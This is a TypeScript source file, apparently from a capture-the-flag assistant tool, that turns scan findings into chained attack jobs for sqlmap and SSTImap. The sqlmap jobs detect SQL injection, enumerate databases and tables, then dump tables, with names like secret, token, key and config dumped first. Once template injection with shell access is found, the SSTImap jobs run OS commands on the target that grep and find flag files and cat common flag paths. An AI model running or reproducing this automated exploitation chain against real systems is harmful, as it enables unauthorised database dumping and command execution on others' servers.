import type { StructuredFinding } from "../state/taskStore";
import { applySuggestionPatch } from "./suggestionEngine";
import type { ToolParameters } from "./commandBuilder";

export interface AutomationJob {
  id: string;
  label: string;
  parameters: ToolParameters;
}

function values(findings: StructuredFinding[], kind: string, context: { database?: string } = {}) {
  return Array.from(new Set(findings
    .filter((finding) => finding.kind === kind)
    .filter((finding) => !context.database || finding.database === context.database)
    .map((finding) => finding.value.trim())
    .filter(Boolean)));
}

function idPart(value: string) {
  return value.toLowerCase().replace(/[^a-z0-9_.-]+/g, "-").replace(/^-|-$/g, "");
}

function sqlParameters(base: ToolParameters, patch: ToolParameters): ToolParameters {
  return {
    ...applySuggestionPatch("sqlmap", base, patch),
    batch: true,
    threads: String(base.threads || "5"),
  };
}

function tablePriority(table: string) {
  return /flag|secret|token|key|config|message|content|data/i.test(table) ? 0 : 1;
}

function buildSqlmapJobs(parameters: ToolParameters, findings: StructuredFinding[]): AutomationJob[] {
  const jobs: AutomationJob[] = [{
    id: "sqlmap-detect",
    label: "探测注入并枚举数据库",
    parameters: sqlParameters(parameters, { dbs: true }),
  }];
  const databases = values(findings, "database").sort((left, right) => left.localeCompare(right));
  const selectedDatabase = String(parameters.database ?? "").trim();
  for (const database of selectedDatabase ? [selectedDatabase] : databases) {
    jobs.push({
      id: `sqlmap-tables-${idPart(database)}`,
      label: `枚举 ${database} 的数据表`,
      parameters: sqlParameters(parameters, { database, tables: true }),
    });
  }
  const selectedTable = String(parameters.table ?? "").trim();
  const tables = selectedTable
    ? [{ value: selectedTable, database: selectedDatabase }]
    : findings
      .filter((finding) => finding.kind === "table" && finding.database)
      .map((finding) => ({ value: finding.value.trim(), database: finding.database ?? "" }))
      .filter((item) => item.value && item.database);
  const uniqueTables = Array.from(new Map(tables.map((item) => [`${item.database}\u0000${item.value}`, item])).values())
    .sort((left, right) => tablePriority(left.value) - tablePriority(right.value) || left.value.localeCompare(right.value));
  for (const { database, value: table } of uniqueTables) {
    jobs.push({
      id: `sqlmap-dump-${idPart(database)}-${idPart(table)}`,
      label: `导出 ${database}.${table}`,
      parameters: sqlParameters(parameters, { database, table, dump: true }),
    });
  }
  return jobs;
}

function shellPattern(prefixes: readonly string[]) {
  const accepted = prefixes
    .map((prefix) => prefix.trim())
    .filter((prefix) => /^[A-Za-z0-9_-]{1,32}$/.test(prefix));
  return (accepted.length ? accepted : ["flag", "CTF"]).map((prefix) => `${prefix}\\{`).join("|");
}

function sstimapParameters(base: ToolParameters, patch: ToolParameters): ToolParameters {
  return { ...applySuggestionPatch("sstimap", base, patch), noColor: true };
}

function hasShellCapability(findings: StructuredFinding[]) {
  return findings.some((finding) => finding.kind === "capability" && /shell command|命令执行/i.test(finding.value));
}

function buildSstimapJobs(parameters: ToolParameters, findings: StructuredFinding[], prefixes: readonly string[]): AutomationJob[] {
  const jobs: AutomationJob[] = [{
    id: "sstimap-detect",
    label: "探测模板注入与执行能力",
    parameters: sstimapParameters(parameters, {}),
  }];
  const engine = values(findings, "engine")[0];
  const technique = values(findings, "technique")[0];
  if (!engine || !technique || !hasShellCapability(findings)) return jobs;
  const pattern = shellPattern(prefixes);
  const shared = { engine, technique };
  jobs.push(
    {
      id: "sstimap-search-content",
      label: "检索可提交内容",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: `grep -R -I -n -E '${pattern}' /app /var/www /home /tmp 2>/dev/null | head -n 200` }),
    },
    {
      id: "sstimap-search-files",
      label: "查找 Flag 文件",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: "find /app /var/www /home /tmp -type f \\( -iname '*flag*' -o -iname '*ctf*' \\) -print 2>/dev/null | head -n 200" }),
    },
    {
      id: "sstimap-search-common-paths",
      label: "读取常见 Flag 路径",
      parameters: sstimapParameters(parameters, { ...shared, osCommand: "for f in /flag /flag.txt /app/flag /app/flag.txt /var/www/html/flag*; do [ -f \"$f\" ] && { echo \"=== $f ===\"; cat \"$f\"; }; done" }),
    },
  );
  return jobs;
}

export function buildAutomationJobs(
  toolId: string,
  parameters: ToolParameters,
  findings: StructuredFinding[],
  prefixes: readonly string[],
): AutomationJob[] {
  if (toolId === "sqlmap") return buildSqlmapJobs(parameters, findings);
  if (toolId === "sstimap") return buildSstimapJobs(parameters, findings, prefixes);
  return [];
}
